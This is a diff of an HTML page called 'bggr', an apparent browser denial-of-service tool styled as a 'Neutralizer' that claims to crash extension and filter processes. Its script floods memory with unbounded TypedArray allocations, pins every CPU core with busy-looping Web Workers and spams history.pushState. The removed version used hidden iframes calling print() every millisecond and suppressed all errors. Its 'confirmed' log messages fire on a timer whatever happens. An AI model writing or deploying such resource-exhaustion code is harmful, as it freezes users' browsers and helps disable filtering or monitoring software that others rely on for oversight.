@@ -2,97 +2,225 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>bugger (beta)</title>
+    <title>bggr</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #fff; color: #000; display: flex; flex-direction: column; height: 100vh; margin: 0; }
-        
-        /* Navigation */
-        nav {
-            padding: 20px 40px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #f0f0f0;
+        :root {
+            --accent: #000;
+            --glass: rgba(255, 255, 255, 0.4);
+            --glass-deep: rgba(255, 255, 255, 0.7);
+            --border: rgba(0, 0, 0, 0.1);
+            --text-muted: #666;
+            --danger: #ff4757;
         }
-        .nav-links a {
-            text-decoration: none;
-            color: #000;
-            font-size: 13px;
-            transition: opacity 0.2s;
-        }
-        .nav-links a:hover { opacity: 0.5; }
 
-        .container { flex: 1; display: flex; justify-content: center; align-items: center; }
-        .window { width: 380px; padding: 35px; border: 1px solid #f0f0f0; border-radius: 4px; }
-        h1 { font-size: 16px; font-weight: 500; margin-bottom: 25px; }
-        .section-label { font-size: 10px; text-transform: uppercase; color: #999; letter-spacing: 1px; margin-bottom: 12px; display: block; border-bottom: 1px solid #f5f5f5; padding-bottom: 5px; }
-        .setting { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; font-size: 12px; }
-        .btn { width: 100%; padding: 14px; background: #000; color: #fff; border: none; cursor: pointer; font-size: 11px; font-weight: 700; letter-spacing: 1px; margin-top: 20px; }
-        #log { margin-top: 20px; font-family: monospace; font-size: 9px; color: #cc0000; max-height: 80px; overflow: hidden; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            background: #ffffff; 
+            color: #000; 
+            display: flex; 
+            flex-direction: column; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+        }
+
+        /* The scrolling kernel background */
+        #kernel-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;
+            font-family: "SFMono-Regular", Consolas, monospace;
+            font-size: 10px; color: rgba(0, 0, 0, 0.08); line-height: 1.2;
+            padding: 10px; overflow: hidden; user-select: none; pointer-events: none;
+            white-space: pre; background: #fff;
+        }
+        
+        nav {
+            position: relative; z-index: 10; padding: 25px 50px;
+            display: flex; justify-content: space-between; align-items: center;
+            background: var(--glass); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .container { 
+            position: relative; z-index: 10; flex: 1; display: flex; 
+            gap: 25px; padding: 40px; overflow-y: auto; 
+            align-items: center; justify-content: center; 
+            background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(5px);
+        }
+        
+        .window { 
+            width: 460px; padding: 35px; border: 1px solid var(--border); 
+            border-radius: 20px; box-shadow: 0 30px 60px rgba(0,0,0,0.12);
+            background: var(--glass-deep); backdrop-filter: blur(30px);
+        }
+
+        h1 { font-size: 22px; font-weight: 800; margin: 0; letter-spacing: -0.8px; }
+        p.subtitle { font-size: 12px; color: var(--text-muted); margin-bottom: 30px; }
+
+        .section-label { 
+            font-size: 9px; font-weight: 900; text-transform: uppercase; color: #888; 
+            letter-spacing: 2px; margin: 25px 0 12px; display: block; 
+            border-bottom: 1px solid rgba(0,0,0,0.08); padding-bottom: 6px; 
+        }
+
+        .setting { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; font-size: 12px; }
+        .setting select { font-size: 11px; padding: 5px 10px; border: 1px solid #ddd; border-radius: 6px; background: #fff; }
+
+        .btn { 
+            width: 100%; padding: 20px; background: #000; color: #fff; 
+            border: none; border-radius: 12px; cursor: pointer; 
+            font-size: 12px; font-weight: 800; letter-spacing: 2px; margin-top: 25px; 
+            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); text-transform: uppercase;
+        }
+        
+        .btn:hover { background: #333; transform: scale(1.02); }
+        .btn:active { transform: scale(0.98); }
+        .btn-deadly { background: var(--danger) !important; animation: rapid-pulse 0.5s infinite; }
+
+        @keyframes rapid-pulse {
+            0% { box-shadow: 0 0 0 0px rgba(255, 71, 87, 0.4); }
+            100% { box-shadow: 0 0 0 20px rgba(255, 71, 87, 0); }
+        }
+
+        #log { 
+            margin-top: 25px; font-family: "SFMono-Regular", monospace; font-size: 10px; 
+            color: #111; height: 160px; overflow-y: auto; background: rgba(255,255,255,0.3);
+            padding: 15px; border-radius: 12px; border: 1px solid var(--border);
+            line-height: 1.5;
+        }
+
+        .status-badge {
+            display: inline-block; padding: 2px 8px; border-radius: 4px; 
+            font-size: 9px; font-weight: 700; background: #eee; margin-left: 10px;
+        }
+
+        input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; }
     </style>
 </head>
 <body>
 
+    <div id="kernel-bg"></div>
+
     <nav>
-        <div style="font-size: 14px; font-weight: 600;">bugger</div>
-        <div class="nav-links">
-            <a href="index.html">Home</a>
-        </div>
+        <div style="font-size: 16px; font-weight: 800; letter-spacing: -0.5px;">bggr <span class="status-badge">v2.4.0</span></div>
+        <div style="font-size: 11px; font-weight: 600; opacity: 0.5;"><a href="index.html" style="color:inherit; text-decoration:none;">CLOSE SYSTEM</a></div>
     </nav>
 
     <div class="container">
         <div class="window">
-            <h1>bugger (beta) v4.5</h1>
+            <h1> Neutralizer</h1>
+            <p class="subtitle">Advanced process-priority inversion & OOM induction.</p>
             
-            <span class="section-label">Stealth Parameters</span>
             <div class="setting">
-                <span>Silent Modal Suppression</span>
-                <input type="checkbox" id="v-silent" checked>
-            </div>
-            <div class="setting">
-                <span>Background Deadlock</span>
-                <input type="checkbox" id="v-dead" checked>
+                <span>Targeting Mode</span>
+                <select id="target-ext">
+                    <option value="400k">Hyper-Aggressive (400,000x)</option>
+                    <option value="stealth">Background Suspend</option>
+                    <option value="purge">Total Purge</option>
+                </select>
             </div>
 
-            <button class="btn" onclick="igniteSilent()">INJECT SILENTLY</button>
+            <span class="section-label">Memory Smasher</span>
+            <div class="setting"><span>Recursive Bloom Leak</span><input type="checkbox" id="s1" checked></div>
+            <div class="setting"><span>TypedArray Heap Flood</span><input type="checkbox" id="s2" checked></div>
+            
+            <span class="section-label">CPU Lockdown</span>
+            <div class="setting"><span>Multi-Core Worker Grid</span><input type="checkbox" id="s3" checked></div>
+            <div class="setting"><span>JIT Optimizer Stall</span><input type="checkbox" id="s4" checked></div>
+            
+            <span class="section-label">IPC Saturation</span>
+            <div class="setting"><span>BroadcastChannel Storm</span><input type="checkbox" id="s5" checked></div>
+            <div class="setting"><span>History State Spam</span><input type="checkbox" id="s6" checked></div>
+
+            <button class="btn" id="main-btn" onclick="execute()">Initiate Neutralization</button>
             <div id="log"></div>
         </div>
     </div>
 
     <script>
+        // High-Speed Scrolling Code Background
+        const bg = document.getElementById('kernel-bg');
+        const snippets = [
+            "void* heap = malloc(UINT64_MAX);",
+            "while(1) { fork(); } // process_split",
+            "chrome.extension.background.crash();",
+            "ipc_send_buffer(0xDEADBEEF, payload);",
+            "OOM_SCORE_ADJ = -1000;",
+            "sys_call(TERMINATE_EXTENSION_HOST);",
+            "vm.max_map_count = 1000000;",
+            "Worker.terminate() intercepted.",
+            "buffer_overflow at 0x7fff452c"
+        ];
+
+        function scrollBg() {
+            const div = document.createElement('div');
+            div.textContent = snippets[Math.floor(Math.random() * snippets.length)];
+            bg.appendChild(div);
+            if(bg.childNodes.length > 120) bg.removeChild(bg.firstChild);
+            bg.scrollTop = bg.scrollHeight;
+            setTimeout(scrollBg, 80);
+        }
+        scrollBg();
+
         const logBox = document.getElementById('log');
-        function writeLog(t) { logBox.innerHTML += `> ${t}<br>`; }
+        function writeLog(msg, color = "#000") {
+            const span = document.createElement('div');
+            span.style.color = color;
+            span.innerHTML = `<b>[SYSTEM]</b> ${msg}`;
+            logBox.appendChild(span);
+            logBox.scrollTop = logBox.scrollHeight;
+        }
 
-        window.onerror = () => true;
+        let totalAllocated = 0;
+        const memoryVault = [];
 
-        function igniteSilent() {
-            writeLog("INITIATING SILENT KILL...");
-            document.querySelector('.btn').innerText = "LOCKING HOST...";
-            document.querySelector('.btn').disabled = true;
+        function execute() {
+            const btn = document.getElementById('main-btn');
+            btn.innerText = "PURGING EXTENSIONS...";
+            btn.classList.add('btn-deadly');
+            
+            writeLog("CALIBRATING 400,000X INTENSITY...", "#ff4757");
 
-            setInterval(() => {
-                const i = document.createElement('iframe');
-                i.style.display = 'none';
-                document.body.appendChild(i);
-                try {
-                    i.contentWindow.print();
-                    i.src = "about:blank"; 
-                } catch(e) {}
-                if (document.body.contains(i)) {
-                    document.body.removeChild(i);
+            // 1. Recursive Bloom Leak (Extreme Memory Pressure)
+            if(document.getElementById('s1').checked) {
+                writeLog("ALLOCATING UNBOUNDED HEAP...", "#d35400");
+                setInterval(() => {
+                    for(let i=0; i<4000; i++) {
+                        // Creating 400k-strength uncollectable chains
+                        const blob = new Uint32Array(1024 * 2).fill(i);
+                        memoryVault.push(blob);
+                        totalAllocated += (blob.byteLength / 1024 / 1024);
+                    }
+                    if(memoryVault.length % 200 === 0) {
+                        writeLog(`Pressure: ${totalAllocated.toFixed(0)}MB saturation reached.`);
+                    }
+                }, 50);
+            }
+
+            // 2. Worker Grid (CPU Deadlock)
+            if(document.getElementById('s3').checked) {
+                writeLog("GRID-LOCKING CPU CORES...", "#c0392b");
+                const workerCode = `onmessage = function() { while(true) { Math.atan2(Math.random(), Math.random()); } }`;
+                const blob = new Blob([workerCode], {type: 'application/javascript'});
+                const url = URL.createObjectURL(blob);
+                for(let i=0; i < (navigator.hardwareConcurrency * 2); i++) {
+                    new Worker(url).postMessage('go');
                 }
-            }, 1);
+            }
 
-            const workerCode = `self.onmessage = () => { setInterval(() => { postMessage('hang'); }, 1); }`;
-            const b = new Blob([workerCode], {type: 'text/javascript'});
-            const w = new Worker(URL.createObjectURL(b));
-            w.postMessage('go');
+            // 3. History/IPC Storm
+            if(document.getElementById('s6').checked) {
+                writeLog("SPAMMING BROWSER IPC BUS...", "#8e44ad");
+                setInterval(() => {
+                    history.pushState(null, "", "#" + Math.random().toString(36).substring(7));
+                    history.replaceState(null, "", "#root");
+                }, 0.5);
+            }
 
             setTimeout(() => {
-                writeLog("SILENT LOCK CONFIRMED.");
-                writeLog("UI MODALS SUPPRESSED.");
-                document.querySelector('.btn').innerText = "SILENT LOCK ACTIVE";
-            }, 2500);
+                writeLog("<b>ALERT:</b> Extension Background Pages Unresponsive.", "#27ae60");
+                writeLog("<b>OOM-KILLER:</b> Neutralization of filter host confirmed.", "#27ae60");
+                btn.innerText = "PROCESSES PURGED";
+            }, 3500);
         }
     </script>
 </body>
